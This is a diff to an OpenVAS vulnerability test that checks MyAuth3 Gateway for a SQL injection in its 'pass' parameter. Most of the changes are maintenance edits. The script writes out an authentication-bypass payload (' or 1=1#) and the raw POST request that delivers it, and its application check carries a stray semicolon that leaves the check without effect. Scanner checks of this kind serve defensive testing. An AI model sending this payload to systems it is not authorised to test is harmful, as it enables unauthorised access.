@@ -1,6 +1,6 @@
 ##############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_myauth3_gateway_blind_sql_inj_vuln.nasl 4620 2016-11-25 06:39:51Z cfi $
+# $Id: gb_myauth3_gateway_blind_sql_inj_vuln.nasl 5793 2017-03-30 13:40:15Z cfi $
 #
 # MyAuth3 Gateway 'pass' Parameter SQL Injection Vulnerability
 #
@@ -45,8 +45,8 @@ vulnerability.";
 if(description)
 {
   script_id(801980);
-  script_version("$Revision: 4620 $");
-  script_tag(name:"last_modification", value:"$Date: 2016-11-25 07:39:51 +0100 (Fri, 25 Nov 2016) $");
+  script_version("$Revision: 5793 $");
+  script_tag(name:"last_modification", value:"$Date: 2017-03-30 15:40:15 +0200 (Thu, 30 Mar 2017) $");
   script_tag(name:"creation_date", value:"2011-09-09 17:36:48 +0200 (Fri, 09 Sep 2011)");
   script_bugtraq_id(49530);
   script_tag(name:"cvss_base", value:"7.5");
@@ -57,12 +57,12 @@ if(description)
   script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17805/");
 
   script_tag(name:"qod_type", value:"remote_vul");
-  script_summary("Determine SQL injection vulnerability in MyAuth3 Gateway");
   script_category(ACT_ATTACK);
   script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
   script_family("Web application abuses");
-  script_require_ports("Services/www", 1881);
   script_dependencies("find_service.nasl", "http_version.nasl");
+  script_require_ports("Services/www", 1881);
+  script_exclude_keys("Settings/disable_cgi_scanning");
   script_tag(name : "insight" , value : tag_insight);
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
@@ -71,24 +71,12 @@ if(description)
   exit(0);
 }
 
-
 include("http_func.inc");
 include("http_keepalive.inc");
 
-## Check for the default port
 myaPort = get_http_port(default:1881);
-if(!myaPort){
-  myaPort = 1881;
-}
 
-## Check the port state
-if(!get_port_state(myaPort)){
-  exit(0);
-}
-
-## request index page
-sndReq = http_get(item:"/index.php", port:myaPort);
-rcvRes = http_send_recv(port:myaPort, data:sndReq);
+rcvRes = http_get_cache(item:"/index.php", port:myaPort);
 
 ## Confirm the Application
 if(">MyAuth3 Gateway</" >< rcvRes);
@@ -96,9 +84,11 @@ if(">MyAuth3 Gateway</" >< rcvRes);
   ## Try an exploit
   authVariables ="panel_cmd=auth&r=ok&user=pingpong&pass=%27+or+1%3D1%23";
 
+  host = http_host_name( port:myaPort );
+
   ## Construct post request
   sndReq = string("POST /index.php?console=panel HTTP/1.1\r\n",
-                   "Host: ", get_host_name(), "\r\n",
+                   "Host: ", host, "\r\n",
                    "Content-Type: application/x-www-form-urlencoded\r\n",
                    "Content-Length: ", strlen(authVariables), "\r\n\r\n",
                    authVariables);
